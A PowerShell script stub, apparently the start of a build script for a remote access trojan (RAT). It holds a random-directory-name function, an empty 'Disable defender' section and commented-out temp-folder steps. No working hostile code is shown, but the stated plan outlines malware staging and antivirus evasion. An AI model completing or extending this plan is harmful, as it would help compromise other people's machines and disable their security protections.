#build resources for RAT
# Created by : Luke O'Sullivan

#Random string for directorys
function random_text{
    
    return -join ((65..90) + (97..122) | Get-Random -Count 5 | % {[char]$_})

}

#Disable defender (May have to be tweeked for Win7)


## Variables
$wd = random_text
echo $wd

#cd $env:temp
#mkdir 